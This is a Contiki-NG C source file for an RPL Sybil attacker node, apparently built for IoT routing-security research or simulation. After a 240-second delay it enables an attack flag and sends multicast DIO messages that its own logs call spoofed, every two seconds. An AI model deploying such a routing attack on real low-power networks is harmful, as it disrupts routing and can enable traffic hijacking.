#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "sys/log.h"

#define LOG_MODULE "SYBIL"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_START_DELAY (240 * CLOCK_SECOND)
#define SYBIL_DIO_INTERVAL (2 * CLOCK_SECOND)

/* Strong application definition overrides the disabled weak Contiki default. */
int sybil_attack_enabled = 0;

PROCESS(sybil_router_process, "Delayed Sybil RPL identity attacker");
AUTOSTART_PROCESSES(&sybil_router_process);

PROCESS_THREAD(sybil_router_process, ev, data)
{
  static struct etimer timer;

  PROCESS_BEGIN();

  LOG_INFO("SYBIL ROUTER: started, attack disabled\n");
  etimer_set(&timer, ATTACK_START_DELAY);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

  sybil_attack_enabled = 1;
  LOG_WARN("SYBIL ATTACK: enabled\n");
  etimer_set(&timer, SYBIL_DIO_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("SYBIL ATTACK: sent spoofed multicast DIO\n");
    etimer_reset(&timer);
  }

  PROCESS_END();
}
